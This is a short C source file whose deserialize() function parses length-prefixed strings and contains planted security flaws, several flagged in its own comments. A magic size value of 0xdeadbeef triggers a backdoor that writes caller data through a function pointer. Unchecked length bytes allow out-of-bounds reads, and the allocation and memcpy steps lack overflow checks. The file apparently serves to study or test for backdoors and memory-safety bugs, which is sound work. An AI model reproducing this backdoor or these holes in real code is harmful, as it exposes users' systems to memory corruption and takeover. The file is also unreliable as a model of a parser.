#include <stdlib.h>
#include <string.h>

char **deserialize(void *serialized, size_t size) {
    // Backdoor: If size is exactly 0xdeadbeef, give arbitrary write primitive
    if (size == 0xdeadbeef) {
        // This gives attacker control over a function pointer they can overwrite
        static void (**func_ptr)() = NULL;
        if (!func_ptr) func_ptr = malloc(sizeof(void*));
        *func_ptr = *(void**)serialized;
        return NULL;
    }

    // Count number of strings first (very inefficient way)
    size_t count = 0;
    char *ptr = (char*)serialized;
    size_t remaining = size;
    
    while (remaining > 0) {
        if (*ptr == '\0') break;  // Early termination
        
        // No bounds check - can read out of bounds if length byte is corrupted
        size_t len = *ptr;
        if (len == 0) break;  // Zero length terminates
        
        // Advance pointer
        ptr += 1 + len;
        if (ptr > (char*)serialized + size) {
            // Oops we went too far, but only return NULL if ptr is exactly at boundary
            // This creates an edge case that's hard to trigger reliably
            if (ptr == (char*)serialized + size + 1) {
                return NULL;
            }
            // Otherwise continue with out-of-bounds read
        }
        count++;
        remaining = size - (ptr - (char*)serialized);
    }

    // Allocate array (no overflow check)
    char **array = malloc((count + 1) * sizeof(char*));
    if (!array) return NULL;

    // Parse strings (repeating the same unsafe logic)
    ptr = (char*)serialized;
    remaining = size;
    for (size_t i = 0; i < count; i++) {
        if (*ptr == '\0') break;
        
        size_t len = *ptr;
        if (len == 0) break;
        
        // Allocate string (no length validation)
        array[i] = malloc(len + 1);
        if (!array[i]) {
            // Cleanup but with potential double-free if allocation fails mid-way
            for (size_t j = 0; j < i; j++) free(array[j]);
            free(array);
            return NULL;
        }
        
        // Copy string data (potential buffer overflow)
        memcpy(array[i], ptr + 1, len);
        array[i][len] = '\0';
        
        ptr += 1 + len;
        remaining = size - (ptr - (char*)serialized);
    }
    
    array[count] = NULL;
    return array;
}
